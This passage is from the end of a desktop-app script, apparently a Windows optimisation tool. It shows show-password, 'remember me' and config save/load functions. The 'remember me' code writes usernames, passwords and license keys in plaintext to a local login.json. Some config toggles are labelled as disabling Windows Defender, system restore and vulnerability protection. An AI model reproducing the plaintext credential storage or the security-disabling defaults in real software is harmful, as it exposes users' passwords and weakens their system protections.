    if (!newKey) return;
    // In real usage, you'd re-check or re-bind the account. For now, just do a placeholder
    alert(`Redeemed key: ${newKey} (demo)`);
    // Potentially update user object in accounts.json
    // etc.
  }

  /***************************************************************
   * 11) SHOW/HIDE PASSWORD
   ***************************************************************/
  function toggleShowPassword(inputId) {
    let input = document.getElementById(inputId);
    if (input.type === "password") {
      input.type = "text";
    } else {
      input.type = "password";
    }
  }

  /***************************************************************
   * 12) SAVE LOGIN (Remember Me)
   ***************************************************************/
  function saveLogin(user, pass, keyVal) {
    let store = {
      username: user,
      password: pass,
      licenseKey: keyVal
    };
    fs.writeFileSync(path.join(__dirname, 'login.json'), JSON.stringify(store, null, 2));
  }
  function loadSavedLogin() {
    let filePath = path.join(__dirname, 'login.json');
    if (fs.existsSync(filePath)) {
      let data = fs.readFileSync(filePath, 'utf8');
      let store = JSON.parse(data);
      if (store.username && store.password) {
        document.getElementById('loginUsername').value = store.username;
        document.getElementById('loginPassword').value = store.password;
        if (store.licenseKey) {
          document.getElementById('loginKey').value = store.licenseKey;
        }
        document.getElementById('saveLoginCheck').checked = true;
      }
    }
  }
  function clearSavedLogin() {
    let filePath = path.join(__dirname, 'login.json');
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
  }

  /***************************************************************
   * 13) SAVE / LOAD CONFIG (Tweak States, etc.)
   ***************************************************************/
  function saveConfig() {
    let configData = readJSON(CONFIG_FILE);
    if (!configData.tweaks) configData.tweaks = {};

    // e.g. store the current state of toggles
    configData.tweaks.fps_gameMode = document.getElementById('toggleGameMode').checked;
    configData.tweaks.fps_gameDVR  = document.getElementById('toggleGameDVR').checked;
    configData.tweaks.fps_fastStartup = document.getElementById('toggleFastStartup').checked;
    configData.tweaks.fps_disable_hpet = document.getElementById('toggle_disable_hpet').checked;
    configData.tweaks.fps_optimize_scheduler = document.getElementById('toggle_optimize_scheduler').checked;
    configData.tweaks.fps_input_delay = document.getElementById('toggle_input_delay').checked;

    configData.tweaks.net_tcp  = document.getElementById('toggleTCP').checked;
    configData.tweaks.net_dns  = document.getElementById('toggleDNSFlush').checked;

    configData.tweaks.vis_anim = document.getElementById('toggleAnimations').checked;
    configData.tweaks.vis_trans= document.getElementById('toggleTransparency').checked;
    configData.tweaks.vis_disable_transparency = document.getElementById('toggle_disable_transparency').checked;
    configData.tweaks.vis_show_seconds = document.getElementById('toggle_show_seconds_in_taskbar_clock').checked;

    configData.tweaks.priv_winupd  = document.getElementById('toggleWinUpdate').checked;
    configData.tweaks.priv_search  = document.getElementById('toggleSearchIndex').checked;
    configData.tweaks.priv_telemetry = document.getElementById('toggleTelemetry').checked;
    configData.tweaks.priv_no_telemetry = document.getElementById('toggle_no_telemetry').checked;
    configData.tweaks.priv_disable_edge_tracking = document.getElementById('toggle_disable_edge_tracking').checked;
    configData.tweaks.priv_disable_app_tracking = document.getElementById('toggle_disable_app_tracking').checked;
    configData.tweaks.priv_disable_web_search = document.getElementById('toggle_disable_web_search').checked;
    configData.tweaks.priv_disable_win_defender = document.getElementById('toggle_disable_win_defender').checked;
    configData.tweaks.priv_disable_update_telemetry = document.getElementById('toggle_disable_update_telemetry').checked;
    configData.tweaks.priv_disable_wi_fi_sense = document.getElementById('toggle_disable_wi_fi_sense').checked;
    configData.tweaks.priv_disable_win_error_reporting = document.getElementById('toggle_disable_win_error_reporting').checked;

    configData.tweaks.misc_remote  = document.getElementById('toggleRemoteAssist').checked;
    configData.tweaks.misc_bgApps  = document.getElementById('toggleBackgroundApps').checked;
    configData.tweaks.misc_debloat = document.getElementById('toggleDebloat').checked;
    configData.tweaks.misc_disable_app_vulnerability = document.getElementById('toggle_disable_app_vulnerability').checked;
    configData.tweaks.misc_disable_sys_restore = document.getElementById('toggle_disable_sys_restore').checked;
    configData.tweaks.misc_disable_throttle = document.getElementById('toggle_disable_throttle').checked;
    configData.tweaks.misc_enable_fast_startup = document.getElementById('toggle_enable_fast_startup').checked;

    configData.tweaks.power_ultimate_performance = document.getElementById('toggle_ultimate_performance').checked;
    configData.tweaks.power_enable_cpu_performance = document.getElementById('toggle_enable_cpu_performance').checked;
    configData.powerPlan = document.getElementById('powerPlanSelect').value || "";

    writeJSON(CONFIG_FILE, configData);
    alert("Config saved!");
  }

  function loadConfig() {
    let configData = readJSON(CONFIG_FILE);
    if (!configData.tweaks) {
      alert("No config found!");
      return;
    }
    let t = configData.tweaks;
    document.getElementById('toggleGameMode').checked = !!t.fps_gameMode;
    document.getElementById('toggleGameDVR').checked  = !!t.fps_gameDVR;
    document.getElementById('toggleFastStartup').checked = !!t.fps_fastStartup;
    document.getElementById('toggle_disable_hpet').checked = !!t.fps_disable_hpet;
    document.getElementById('toggle_optimize_scheduler').checked = !!t.fps_optimize_scheduler;
    document.getElementById('toggle_input_delay').checked = !!t.fps_input_delay;

    document.getElementById('toggleTCP').checked   = !!t.net_tcp;
    document.getElementById('toggleDNSFlush').checked = !!t.net_dns;

    document.getElementById('toggleAnimations').checked   = !!t.vis_anim;
    document.getElementById('toggleTransparency').checked = !!t.vis_trans;
    document.getElementById('toggle_disable_transparency').checked = !!t.vis_disable_transparency;
    document.getElementById('toggle_show_seconds_in_taskbar_clock').checked = !!t.vis_show_seconds;

    document.getElementById('toggleWinUpdate').checked   = !!t.priv_winupd;
    document.getElementById('toggleSearchIndex').checked = !!t.priv_search;
    document.getElementById('toggleTelemetry').checked   = !!t.priv_telemetry;
    document.getElementById('toggle_no_telemetry').checked = !!t.priv_no_telemetry;
    document.getElementById('toggle_disable_edge_tracking').checked = !!t.priv_disable_edge_tracking;
    document.getElementById('toggle_disable_app_tracking').checked = !!t.priv_disable_app_tracking;
    document.getElementById('toggle_disable_web_search').checked = !!t.priv_disable_web_search;
    document.getElementById('toggle_disable_win_defender').checked = !!t.priv_disable_win_defender;
    document.getElementById('toggle_disable_update_telemetry').checked = !!t.priv_disable_update_telemetry;
    document.getElementById('toggle_disable_wi_fi_sense').checked = !!t.priv_disable_wi_fi_sense;
    document.getElementById('toggle_disable_win_error_reporting').checked = !!t.priv_disable_win_error_reporting;

    document.getElementById('toggleRemoteAssist').checked    = !!t.misc_remote;
    document.getElementById('toggleBackgroundApps').checked  = !!t.misc_bgApps;
    document.getElementById('toggleDebloat').checked         = !!t.misc_debloat;
    document.getElementById('toggle_disable_app_vulnerability').checked = !!t.misc_disable_app_vulnerability;
    document.getElementById('toggle_disable_sys_restore').checked = !!t.misc_disable_sys_restore;
    document.getElementById('toggle_disable_throttle').checked = !!t.misc_disable_throttle;
    document.getElementById('toggle_enable_fast_startup').checked = !!t.misc_enable_fast_startup;

    document.getElementById('toggle_ultimate_performance').checked = !!t.power_ultimate_performance;
    document.getElementById('toggle_enable_cpu_performance').checked = !!t.power_enable_cpu_performance;
    document.getElementById('powerPlanSelect').value = configData.powerPlan || "";
    alert("Config loaded!");
  }

</script>
</body>
</html>
